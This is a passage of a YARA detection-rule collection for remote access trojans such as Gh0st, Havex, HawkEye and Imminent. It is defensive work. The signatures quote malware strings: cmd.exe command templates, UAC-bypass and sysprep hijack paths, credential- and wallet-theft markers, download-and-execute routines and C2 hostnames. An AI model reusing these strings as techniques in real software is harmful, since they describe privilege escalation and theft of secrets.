(https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ = /(G)host/\n        $ = /(i)nflate 1\\.1\\.4 Copyright 1995-2002 Mark Adler/\n        $ = /(d)eflate 1\\.1\\.4 Copyright 1995-2002 Jean-loup Gailly/\n        $ = /(%)s\\\\shell\\\\open\\\\command/\n        $ = /(G)etClipboardData/\n        $ = /(W)riteProcessMemory/\n        $ = /(A)djustTokenPrivileges/\n        $ = /(W)inSta0\\\\Default/\n        $ = /(#)32770/\n        $ = /(#)32771/\n        $ = /(#)32772/\n        $ = /(#)32774/\n\n    condition:\n        all of them\n}\n\nrule Codoso_Gh0st_3\n{\n    meta:\n        description = \"Gh0st RAT\"\n        threat_names = \"Gh0st RAT\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_Gh0st_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"RunMeByDLL32\" fullword ascii\n        $s1 = \"svchost.dll\" fullword wide\n        $s2 = \"server.dll\" fullword ascii\n        $s3 = \"Copyright ? 2008\" fullword wide\n        $s4 = \"testsupdate33\" fullword ascii\n        $s5 = \"Device Protect Application\" fullword wide\n        $s6 = \"MSVCP60.DLL\" fullword ascii\n        $s7 = \"\u001fmail-news.eicp.net\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 195KB and $x1 or 4 of them\n}\n\nrule Codoso_Gh0st_2\n{\n    meta:\n        description = \"Gh0st RAT\"\n        threat_names = \"Gh0st RAT\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_Gh0st_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s\" fullword ascii\n        $s1 = \"rundll32.exe \\\"%s\\\", RunMeByDLL32\" fullword ascii\n        $s13 = \"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}\" fullword wide\n        $s14 = \"%s -r debug 1\" fullword ascii\n        $s15 = \"\\\\\\\\.\\\\keymmdrv1\" fullword ascii\n        $s17 = \"RunMeByDLL32\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and 1 of them\n}\n\nrule Codoso_Gh0st_1\n{\n    meta:\n        description = \"Gh0st RAT\"\n        threat_names = \"Gh0st RAT\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_Gh0st_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s\" fullword ascii\n        $x2 = \"rundll32.exe \\\"%s\\\", RunMeByDLL32\" fullword ascii\n        $x3 = \"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}\" fullword wide\n        $x4 = \"\\\\\\\\.\\\\keymmdrv1\" fullword ascii\n        $s1 = \"spideragent.exe\" fullword ascii\n        $s2 = \"AVGIDSAgent.exe\" fullword ascii\n        $s3 = \"kavsvc.exe\" fullword ascii\n        $s4 = \"mspaint.exe\" fullword ascii\n        $s5 = \"kav.exe\" fullword ascii\n        $s6 = \"avp.exe\" fullword ascii\n        $s7 = \"NAV.exe\" fullword ascii\n        $c1 = \"Elevation:Administrator!new:\" wide\n        $c2 = \"Global\\\\RUNDLL32EXITEVENT_NAME{12845-8654-543}\" fullword ascii\n        $c3 = \"\\\\sysprep\\\\sysprep.exe\" fullword wide\n        $c4 = \"\\\\sysprep\\\\CRYPTBASE.dll\" fullword wide\n        $c5 = \"Global\\\\TERMINATEEVENT_NAME{12845-8654-542}\" fullword ascii\n        $c6 = \"ConsentPromptBehaviorAdmin\" fullword ascii\n        $c7 = \"\\\\sysprep\" fullword wide\n        $c8 = \"Global\\\\UN{5FFC0C8B-8BE5-49d5-B9F2-BCDC8976EE10}\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and (4 of ($s*) or 4 of ($c*)) or 1 of ($x*) or 6 of ($c*)\n}\n\nrule GoldDragon_Ghost419_RAT\n{\n    meta:\n        description = \"Gh0st RAT\"\n        threat_names = \"Gh0st RAT\"\n        ref = \"https://goo.gl/rW1yvZ\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GoldDragon_Ghost419_RAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322)\" fullword ascii\n        $x2 = \"WebKitFormBoundarywhpFxMBe19cSjFnG\" ascii\n        $x3 = \"\\\\Microsoft\\\\HNC\\\\\" fullword ascii\n        $x4 = \"\\\\anternet abplorer\" fullword ascii\n        $x5 = \"%s\\\\abxplore.exe\" fullword ascii\n        $x6 = \"GHOST419\" fullword ascii\n        $x7 = \"I,m Online. %04d - %02d - %02d - %02d - %02d\" fullword ascii\n        $x8 = \"//////////////////////////regkeyenum//////////////\" fullword ascii\n        $s1 = \"www.GoldDragon.com\" fullword ascii\n        $s2 = \"/c systeminfo >> %s\" fullword ascii\n        $s3 = \"/c dir %s\\\\ >> %s\" fullword ascii\n        $s4 = \"DownLoading %02x, %02x, %02x\" fullword ascii\n        $s5 = \"Tran_dll.dll\" fullword ascii\n        $s6 = \"MpCmdRunkr.dll\" fullword ascii\n        $s7 = \"MpCmdRun.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and (pe.exports(\"ExportFunction\") or 1 of ($x*) or 2 of them)\n}\n\nrule glassRAT\n{\n    meta:\n        description = \"GlassRAT malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"GlassRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"RSA RESEARCH\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"glassRAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $bin1 = {85 C0 B3 01}\n        $bin3 = {68 4C 50 00 10}\n        $bin4 = {68 48 50 00 10}\n        $bin5 = {68 44 50 00 10}\n        $hs = {CB FF 5D C9 AD 3F 5B A1 54 13 FE FB 05 C6 22}\n        $s1 = \"pwlfnn10,gzg\"\n        $s2 = \"AddNum\"\n        $s3 = \"ServiceMain\"\n        $s4 = \"The Window\"\n        $s5 = \"off.dat\"\n\n    condition:\n        all of ($bin*) and $hs and 3 of ($s*)\n}\n\nrule GlassRAT_Generic\n{\n    meta:\n        description = \"GlassRAT malware\"\n        ref = \"https://blogs.rsa.com/peering-into-glassrat/\"\n        classifications = \"Backdoor\"\n        threat_names = \"GlassRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GlassRAT_Generic\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmd.exe /c %s\" fullword ascii\n        $s2 = \"update.dll\" fullword ascii\n        $s3 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\RasAuto\\\\Parameters\" fullword ascii\n        $s4 = \"%%temp%%\\\\%u\" fullword ascii\n        $s5 = \"\\\\off.dat\" fullword ascii\n        $s6 = \"rundll32 \\\"%s\\\",AddNum\" fullword ascii\n        $s7 = \"cmd.exe /c erase /F \\\"%s\\\"\" fullword ascii\n        $s8 = \"SYSTEM\\\\ControlSet00%d\\\\Services\\\\RasAuto\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 15MB and 5 of them\n}\n\nrule Greame\n{\n    meta:\n        description = \"Greame RAT\"\n        ref = \"http://malwareconfig.com/stats/Greame\"\n        classifications = \"Backdoor\"\n        threat_names = \"Greame\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Greame\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}\n        $b = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}\n        $c = \"EditSvr\"\n        $d = \"TLoader\"\n        $e = \"Stroks\"\n        $f = \"Avenger by NhT\"\n        $g = \"####@####\"\n        $h = \"GREAME\"\n\n    condition:\n        all of them\n}\n\nrule Win32OPCHavex\n{\n    meta:\n        description = \"Havex RAT\"\n        ref = \"www.f-secure.com/weblog/archives/00002718.html\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Havex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"BAE Systems\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Win32OPCHavex\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $dll = \"7CFC52CD3F87.dll\"\n        $a1 = \"Start finging of LAN hosts...\" wide\n        $a2 = \"Finding was fault. Unexpective error\" wide\n        $a3 = \"Was found %i hosts in LAN:\" wide\n        $a4 = \"Hosts was't found.\" wide\n        $a5 = \"Start finging of OPC Servers...\" wide\n        $a6 = \"Was found %i OPC Servers.\" wide\n        $a7 = \"OPC Servers not found. Programm finished\" wide\n        $a8 = \"%s[%s]!!!EXEPTION %i!!!\" wide\n        $a9 = \"Start finging of OPC Tags...\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and ($dll or (any of ($a*)))\n}\n\nrule Win32FertgerHavex\n{\n    meta:\n        description = \"Havex RAT\"\n        ref = \"www.f-secure.com/weblog/archives/00002718.html\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Havex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"BAE Systems\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Win32FertgerHavex\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"\\\\\\\\.\\\\pipe\\\\mypipe-f\" wide\n        $a2 = \"\\\\\\\\.\\\\pipe\\\\mypipe-h\" wide\n        $a3 = \"\\\\qln.dbx\" wide\n        $a4 = \"*.yls\" wide\n        $a5 = \"\\\\*.xmd\" wide\n        $a6 = \"fertger\" wide\n        $a7 = \"havex\"\n\n    condition:\n        uint16(0) == 0x5a4d and 3 of ($a*)\n}\n\nrule Havex_Trojan_PHP_Server\n{\n    meta:\n        description = \"Havex RAT PHP server\"\n        ref = \"www.f-secure.com/weblog/archives/00002718.html\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Havex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Havex_Trojan_PHP_Server\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"havex--></body></head>\"\n        $s2 = \"ANSWERTAG_START\"\n        $s3 = \"PATH_BLOCKFILE\"\n\n    condition:\n        all of them\n}\n\nrule SANS_ICS_Cybersecurity_Challenge_400_Havex_Memdump : memory\n{\n    meta:\n        description = \"Havex RAT\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Havex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Chris Sistrunk\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"SANS_ICS_Cybersecurity_Challenge_400_Havex_Memdump\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"~tracedscn.yls\" fullword wide\n        $s2 = \"[!]Start\" fullword wide\n        $s3 = \"[+]Get WSADATA\" fullword wide\n        $s4 = \"[-]Can not get local ip\" fullword wide\n        $s5 = \"[+]Local:\" fullword wide\n        $s6 = \"[-]Threads number > Hosts number\" fullword wide\n        $s7 = \"[-]Connection error\" fullword wide\n        $x1 = \"bddd4e2b84fa2ad61eb065e7797270ff.exe\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and (3 of ($s*) or $x1)\n}\n\nrule HawkEye_Keylogger_Feb18_1\n{\n    meta:\n        description = \"HawkEye RAT\"\n        ref = \"https://app.any.run/tasks/ae2521dd-61aa-4bc7-b0d8-8c85ddcbfcc9\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"HawkEye\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"HawkEye_Keylogger_Feb18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"UploadReportLogin.asmx\" fullword wide\n        $s2 = \"tmp.exe\" fullword wide\n        $s3 = \"%appdata%\\\\\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule RAT_HawkEye\n{\n    meta:\n        description = \"HawkEye RAT\"\n        ref = \"http://malwareconfig.com/stats/HawkEye\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"HawkEye\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_HawkEye\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $key = \"HawkEyeKeylogger\" wide\n        $salt = \"099u787978786\" wide\n        $string1 = \"HawkEye_Keylogger\" wide\n        $string2 = \"holdermail.txt\" wide\n        $string3 = \"wallet.dat\" wide\n        $string4 = \"Keylog Records\" wide\n        $string5 = \"<!-- do not script -->\" wide\n        $string6 = \"\\\\pidloc.txt\" wide\n        $string7 = \"BSPLIT\" wide\n\n    condition:\n        $key and $salt and all of ($string*)\n}\n\nrule HawkEye_Reborn\n{   \n    meta:\n        description = \"HawkEye RAT\"\n        classifications = \"Backdoor,Spyware\"\n        threat_names = \"HawkEye\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"RebornX Stub.exe\" wide ascii\n        $s2 = \"ConfuserEx v1.0.0\" wide ascii\n        $s3 = \"ConfusedByAttribute\" wide ascii\n        $s4 = \"HawkEye RebornX\" wide ascii\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($s*)\n}\n\nrule hiZor_RAT : RAT\n{\n    meta:\n        description = \"hiZor RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"hiZor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_win32_dll_rat_hiZor_RAT\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = { c7 [5] 40 00 62 00 c7 [5] 77 00 64 00 c7 [5] 61 00 61 00 c7 [5] 6c 00 }\n        $s2 = { 66 [7] 0d 40 83 ?? ?? 7c ?? }\n        $s3 = { 80 [2] 2e 40 3b ?? 72 ?? }\n        $s4 = \"CmdProcessExited\" wide ascii\n        $s5 = \"rootDir\" wide ascii\n        $s6 = \"DllRegisterServer\" wide ascii\n        $s7 = \"GetNativeSystemInfo\" wide ascii\n        $s8 = \"%08x%08x%08x%08x\" wide ascii\n\n    condition:\n        (uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f) and (all of them)\n}\n\nprivate rule iexpl0reCode : iexpl0ree Family\n{\n    meta:\n        description = \"iexpl0re code features\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"iexpl0reCode\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = { 47 83 FF 64 0F 8C 6D FF FF FF 33 C0 5F 5E 5B C9 C3 }\n        $ = { 80 74 0D A4 44 41 3B C8 7C F6 68 04 01 00 00 }\n        $ = { 8A C1 B2 07 F6 EA 30 04 31 41 3B 4D 10 7C F1 }\n        $ = { 47 83 FF 64 0F 8C 79 FF FF FF 33 C0 5F 5E 5B C9 C3 }\n        $ = { 68 88 00 00 00 68 90 06 00 00 68 ?? ?? ?? ?? 89 3? E8 }\n        $ = { BB 88 00 00 00 53 68 90 06 00 00 68 ?? ?? ?? ?? 89 3? E8 }\n\n    condition:\n        any of them\n}\n\nprivate rule iexpl0reStrings : iexpl0re Family\n{\n    meta:\n        description = \"Strings used by iexpl0re\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"iexpl0reStrings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = \"%USERPROFILE%\\\\IEXPL0RE.EXE\"\n        $ = \"\\\"<770j ((\"\n        $ = \"\\\\Users\\\\%s\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\IEXPL0RE.LNK\"\n        $ = \"\\\\Documents and Settings\\\\%s\\\\Application Data\\\\Microsoft\\\\Internet Explorer\\\\IEXPL0RE.EXE\"\n        $ = \"LoaderV5.dll\"\n        $ = \"POST /index%0.9d.asp HTTP/1.1\"\n        $ = \"GET /search?n=%0.9d&\"\n        $ = \"DUDE_AM_I_SHARP-3.14159265358979x6.626176\"\n        $ = \"WHO_A_R_E_YOU?2.99792458x1.25663706143592\"\n        $ = \"BASTARD_&&_BITCHES_%0.8x\"\n        $ = \"c:\\\\bbb\\\\eee.txt\"\n\n    condition:\n        any of them\n}\n\nrule iexpl0re : Family\n{\n    meta:\n        description = \"iexpl0re RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"iexpl0re\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"iexpl0re\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        iexpl0reCode or iexpl0reStrings\n}\n\nrule Imminent\n{\n    meta:\n        original_name = \"RAT_Imminent\"\n        description = \"Imminent RAT\"\n        threat_names = \"Imminent\"\n        ref = \"http://malwareconfig.com/stats/Imminent\"\n        classifications = \"Backdoor\"\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $v1a = \"DecodeProductKey\"\n        $v1b = \"StartHTTPFlood\"\n        $v1c = \"CodeKey\"\n        $v1d = \"MESSAGEBOX\"\n        $v1e = \"GetFilezillaPasswords\"\n        $v1f = \"DataIn\"\n        $v1g = \"UDPzSockets\"\n        $v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}\n        $v2a = \"<URL>k__BackingField\"\n        $v2b = \"<RunHidden>k__BackingField\"\n        $v2c = \"DownloadAndExecute\"\n        $v2d = \"-CHECK & PING -n 2 127.0.0.1 & EXIT\" wide\n        $v2e = \"england.png\" wide\n        $v2f = \"Showed Messagebox\" wide\n\n    condition:\n        all of ($v1*) or all of ($v2*)\n}\n\nrule Indetectables_RAT\n{\n    meta:\n        description = \"Indetectables RAT\"\n        ref = \"http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Indetectables\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Indetectables_RAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Coded By M3\" fullword wide\n        $s2 = \"Stub Undetector M3\" fullword wide\n        $s3 = \"www.webmenegatti.com.br\" wide\n        $s4 = \"M3n3gatt1\" fullword wide\n        $s5 = \"TheMisterFUD\" fullword wide\n        $s6 = \"KillZoneKillZoneKill\" fullword ascii\n        $s7 = \"[[__M3_F_U_D_M3__]]$\" fullword ascii\n        $s8 = \"M3_F_U_D_M3\" ascii\n        $s9 = \"M3n3gatt1hack3r\" fullword wide\n        $s10 = \"M3n3gatt1hack3r\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 5000KB and 1 of them\n}\n\nrule Infinity\n{\n    meta:\n        description = \"Infinity RAT\"\n        ref = \"http://malwareconfig.com/stats/Infinity\"\n        classifications = \"Backdoor\"\n        threat_names = \"Infinity RAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Infinity\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"CRYPTPROTECT_PROMPTSTRUCT\"\n        $b = \"discomouse\"\n        $c = \"GetDeepInfo\"\n        $d = \"AES_Encrypt\"\n        $e = \"StartUDPFlood\"\n        $f = \"BATScripting\" wide\n        $g = \"FBqINhRdpgnqATxJ.html\" wide\n        $i = \"magic_key\" wide\n\n    condition:\n        all of them\n}\n\nrule Inocnation\n{\n    meta:\n        description = \"Inocnation RAT\"\n        threat_names = \"Inocnation RAT\"\n        ref = \"https://www.fidelissecurity.com/sites/default/files/FTA_1020_Fidelis_Inocnation_FINAL.pdf\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Fidelis Cybersecurity\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"apt_win32_dll_rat_1a53b0cp32e46g0qio7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = { c7 [2] 64 00 63 00 c7 [2] 69 00 62 00 c7 [2] 7a 00 7e 00 c7 [2] 2d 00 43 00 c7 [2] 59 00 2d 00 c7 [2] 3b 00 23 00 c7 [2] 3e 00 36 00 c7 [2] 2d 00 5a 00 c7 [2] 42 00 5a 00 c7 [2] 3b 00 39 00 c7 [2] 36 00 2d 00 c7 [2] 59 00 7f 00 c7 [2] 64 00 69 00 c7 [2] 68 00 63 00 c7 [2] 79 00 22 00 c7 [2] 3a 00 23 00 c7 [2] 3d 00 36 00 c7 [2] 2d 00 7f 00 c7 [2] 7b 00 37 00 c7 [2] 3c 00 3c 00 c7 [2] 23 00 3d 00 c7 [2] 24 00 2d 00 c7 [2] 61 00 64 00 c7 [2] 66 00 68 00 c7 [2] 2d 00 4a 00 c7 [2] 68 00 6e 00 c7 [2] 66 00 62 00 }\n        $s2 = { c7 [2] 23 00 24 00 c7 [2] 24 00 33 00 c7 [2] 38 00 22 00 c7 [2] 00 00 33 00 c7 [2] 24 00 25 00 c7 [2] 3f 00 39 00 c7 [2] 38 00 0a 00 c7 [2] 04 00 23 00 c7 [2] 38 00 00 00 c7 [2] 43 00 66 00 c7 [2] 6d 00 60 00 c7 [2] 67 00 52 00 c7 [2] 6e 00 63 00 c7 [2] 7b 00 67 00 c7 [2] 70 00 00 00 c7 [2] 43 00 4d 00 c7 [2] 44 00 00 00 c7 [2] 0f 00 43 00 c7 [2] 00 00 50 00 c7 [2] 49 00 4e 00 c7 [2] 47 00 00 00 c7 [2] 11 00 12 00 c7 [2] 17 00 0e 00 c7 [2] 10 00 0e 00 c7 [2] 10 00 0e 00 c7 [2] 11 00 06 00 c7 [2] 44 00 45 00 c7 [2] 4c 00 00 00 }\n        $s3 = { 66 [4-7] 0d 40 83 f8 44 7c ?? }\n        $s4 = { 66 [4-7] 14 40 83 f8 14 7c ?? }\n        $s5 = { 66 [4-7] 56 40 83 f8 2d 7c ?? }\n        $s6 = { 66 [4-7] 20 40 83 f8 1a 7c ?? }\n        $s7 = { 80 [2-7] 2e 40 3d 50 02 00 00 72 ?? }\n        $s8 = \"%08x%08x%08x%08x\" wide ascii\n        $s9 = \"WinHttpGetIEProxyConfigForCurrentUser\" wide ascii\n\n    condition:\n        (uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f) and (all of them)\n}\n\nrule ISMRAT_gen\n{\n    meta:\n        description = \"ISM RAT\"\n        threat_names = \"ISM RAT\"\n        ref = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2017/february/ism-rat/\"\n        classifications = \"Trojan, Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Ahmed Zaki\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Trojan_ISMRAT_gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"WinHTTP Example/1.0\" wide\n        $s2 = \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0\" wide\n        $s3 = \"|||Command executed successfully\"\n        $dir = /Microsoft\\\\Windows\\\\Tmpe[a-z0-9]{2,8}/\n\n    condition:\n        uint16(0) == 0x5A4D and all of them\n}\n\nrule JavaDropper\n{\n    meta:\n        description = \"JavaDropper RAT\"\n        ref = \"http://malwareconfig.com/stats/JavaDropper\"\n        classifications = \"Backdoor\"\n        threat_names = \"JavaDropper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net> (slightly modified by Florian Roth to improve performance)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_JavaDropper\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $jar = \"META-INF/MANIFEST.MF\"\n        $b1 = \"config.ini\"\n        $b2 = \"password.ini\"\n        $c1 = \"stub/stub.dll\"\n\n    condition:\n        $jar and (all of ($b*) or all of ($c*))\n}\n\nrule konni\n{\n    meta:\n        description = \"Konni RAT\"\n        ref = \"https://vallejo.cc/2017/07/08/analysis-of-new-variant-of-konni-rat/, http://blog.talosintelligence.com/2017/07/konni-references-north-korean-missile-capabilities.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"Konni\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"tjadanel @reonfleek\"\n        source = \"https://github.com/tjnel/yara_repo\"\n        